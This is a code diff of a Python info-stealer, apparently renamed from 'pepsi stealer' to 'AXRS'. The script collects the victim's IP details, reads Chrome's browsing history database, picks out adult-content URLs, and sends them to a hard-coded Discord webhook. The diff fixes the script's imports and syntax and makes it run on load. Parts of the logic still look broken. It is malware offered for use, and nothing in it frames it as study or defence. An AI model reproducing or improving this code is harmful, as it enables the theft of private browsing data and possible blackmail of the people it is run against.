@@ -3,14 +3,12 @@ import re
 import json
 import requests
 from urllib.request import Request, urlopen
-import sqlite
+import sqlite3
 
 wh_url = "https://discord.com/api/webhooks/1213517165752492144/-dvwI93Lok88wnx3h5oo9z9FmQN7RzQSVlSyebVvQiZwj0_aeKhRzMzErAcOsmRwfFrs" # Too lazy
 ip_url = "https://ipinfo.io/json"
 base_url = "https://discord.com/channels/@me"
 
-  # Call to the fuckin ip info url shit
-global ip_url
 req = Request(ip_url, headers={'User-Agent': 'Mozilla/5.0'})
 ipinfo = urlopen(req).read()
 ipinfo = json.loads(ipinfo)
@@ -24,7 +22,6 @@ token=""
 
 try:
 
-    try:
             full_path = os.environ['LOCALAPPDATA'] + "\\Google\\Chrome\\User Data\\Default\\" + "History"
             # Open with SQLite
             conn = sqlite3.connect(full_path)
@@ -104,7 +101,7 @@ def main():
         'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
     }
 
-    payload = json.dumps({'content': message})
+    payload = json.dumps({'content': message, 'username': 'AXRS'})
 
     try:
         req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
@@ -112,25 +109,24 @@ def main():
     except:
         pass
 
-if __name__ == '__main__':
-    main()
 
 
-link=links.split("\n")
+
+link=links
 links=[]
-for (url in links):
+for url in links:
    if (("porn") in url or ("hentai") in url or ("r34") in url or ("balls") in url ):
      links.append(url)
   
 
 
 embed={
-    "username": "pepsi stealer",
+    "username": "AXRS",
     "content": f" **History**: ```{links}```"
   }
 
   # Send via requests and webhook url
 requests.post(wh_url, data=embed)
-
+main()
 
 
